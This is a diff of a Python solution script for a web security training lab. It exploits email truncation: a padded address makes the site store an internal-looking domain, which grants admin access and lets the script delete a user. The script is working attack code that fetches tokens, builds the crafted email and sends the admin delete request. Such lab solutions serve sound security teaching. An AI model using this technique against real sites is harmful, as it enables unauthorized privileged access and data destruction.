@@ -2,23 +2,21 @@
 #
 # Author: Ahmed Elqalawy (@elqal3awii)
 #
-# Date: 25/10/2023
+# Date: 27/10/2023
 #
-# Lab: Inconsistent security controls
+# Lab: Inconsistent handling of exceptional input
 #
 # Steps: 1. Fetch the register page
 #        2. Extract csrf token and session cookie to register a new account
-#        3. Register a new account as attacker
+#        3. Register a new account Register a new account with a suitable offset
+#           and dontwannacry.com before the real domain
 #        4. Fetch the email client
 #        5. Extract the link of account registration
 #        6. Complete the account registration by following the link
 #        7. Fetch the login page
 #        8. Extract csrf token and session cookie to login
-#        9. Login as attacker
-#        10. Fetch attacker's profile
-#        11. Extract csrf token needed for email update
-#        12. Update the email to attacker@dontwannacry.com
-#        13. Delete carlos from the admin panel
+#        9. Login to the new account
+#        10. Delete carlos from the admin panel
 #
 #######################################################################################
 
@@ -36,10 +34,10 @@ from colorama import Fore
 ###########
 
 # change this to your lab URL
-url = "https://0a9000c704fa8040824ef7af009e00b8.web-security-academy.net"
+url = "https://0a67002a03d64d7f84fd6e8b00c30082.web-security-academy.net"
 
 # change this to your exploit domain
-exploit_domain = "exploit-0a1d00f8041880908292f67201f10036.exploit-server.net"
+exploit_domain = "exploit-0a66007d03154d9184b66d1801060084.exploit-server.net"
 
 try:  
     # fetch register page
@@ -67,8 +65,15 @@ username = "attacker"
 # you can change this to what you want
 password = "hacking"
 
-# the email addresss of the attacker
-attacker_email = f"attacker@{exploit_domain}"
+# the offset before the real email
+# you can change the "a" char to any other alphabetical char
+offset = "a" * 238
+
+# the email we want to set our account with
+target_email = "dontwannacry.com"
+
+# the final email address
+malicious_email = f"{offset}@{target_email}.{exploit_domain}"
 
 # set session cookie
 cookies = {
@@ -80,7 +85,7 @@ data = {
     "username": username,
     "password": password,
     "csrf": csrf,
-    "email": attacker_email,
+    "email": malicious_email,
 }
 
 try:    
@@ -91,7 +96,7 @@ except:
     print(Fore.RED + "[!] Failed to register a new account through exception")
     exit(1)
 
-print(Fore.WHITE + "⦗3⦘ Registering a new account as " + Fore.YELLOW + username + Fore.WHITE + ".. " + Fore.GREEN + "OK")
+print(Fore.WHITE + "⦗3⦘ Registering a new account with a suitable offset and dontwannacry.com before the real domain.. " + Fore.GREEN + "OK")
 
 try:    
     # fetch the email client
@@ -156,7 +161,7 @@ except:
     print(Fore.RED + "[!] Failed to login to the new account through exception")
     exit(1)
 
-print(Fore.WHITE + "⦗9⦘ Logging in as " + Fore.YELLOW + username + Fore.WHITE + ".. " + Fore.GREEN + "OK")
+print(Fore.WHITE + "⦗9⦘ Logging in to the new account.. " + Fore.GREEN + "OK")
 
 # get session cookie
 session = login.cookies.get("session")
@@ -167,45 +172,6 @@ cookies = {
 }
 
 try:    
-    # fetch the profile page
-    profile = requests.get(f"{url}/my-account", cookies=cookies)
-    
-except:
-    print(Fore.RED + "[!] Failed to fetch the profile page through exception")
-    exit(1)
-
-print(Fore.WHITE + "⦗10⦘ Fetching " + Fore.YELLOW + username + Fore.WHITE + "'s profile.. " + Fore.GREEN + "OK")
-
-# extract the csrf token
-csrf = re.findall("csrf.+value=\"(.+)\"", profile.text)[0]
-
-print(Fore.WHITE + "⦗11⦘ Extracting csrf token needed for email update.. " + Fore.GREEN + "OK")
-
-# the new email
-new_email = f"{username}@dontwannacry.com"
-
-# data to send via POST
-data = {
-    "email": new_email,
-    "csrf": csrf
-}
-
-# set session cookie
-cookies = {
-    "session": session
-}
-
-try:    
-    # update the email
-    requests.post(f"{url}/my-account/change-email", data, cookies=cookies)
-    
-except:
-    print(Fore.RED + "[!] Failed to update the email through exception")
-    exit(1)
-
-print(Fore.WHITE + "⦗12⦘ Updating the email to " + Fore.YELLOW + new_email + Fore.WHITE + ".. " + Fore.GREEN + "OK")
-
-try:    
     # delete carlos from the admin panel
     requests.get(f"{url}/admin/delete?username=carlos", cookies=cookies)
     
@@ -213,5 +179,5 @@ except:
     print(Fore.RED + "[!] Failed to delete carlos from the admin panel through exception")
     exit(1)
 
-print(Fore.WHITE + "⦗13⦘ Deleting carlos from the admin panel.. " + Fore.GREEN + "OK")
+print(Fore.WHITE + "⦗10⦘ Deleting carlos from the admin panel.. " + Fore.GREEN + "OK")
 print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")
